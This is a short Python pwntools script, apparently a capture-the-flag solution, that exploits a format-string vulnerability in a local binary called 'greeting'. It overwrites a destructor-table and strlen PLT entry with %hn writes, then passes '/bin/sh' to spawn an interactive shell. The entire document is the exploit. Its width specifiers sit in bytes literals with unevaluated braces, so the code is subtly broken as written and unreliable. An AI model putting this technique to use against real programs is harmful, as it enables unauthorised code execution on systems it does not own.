import struct
import pwn

io = pwn.process("./greeting")

strlen_plt  = 0x08049a54
dtors_addr  = 0x08049934

def b(x):
    return struct.pack("I", x)

exploit = b"AA"
exploit += b(dtors_addr)
exploit += b(strlen_plt + 2)
exploit += b(strlen_plt)
exploit += b"%#{0x0804 - 20 - 12}x"
exploit += b"%12$hn"
exploit += b"%#{0x8490 - 0x0804}x"
exploit += b"%13$hn"
exploit += b"%#{0x85ed - 0x8490}x"
exploit += b"%14$hn\n"

io.sendline(exploit)
io.sendline(b"/bin/sh")
io.interactive()
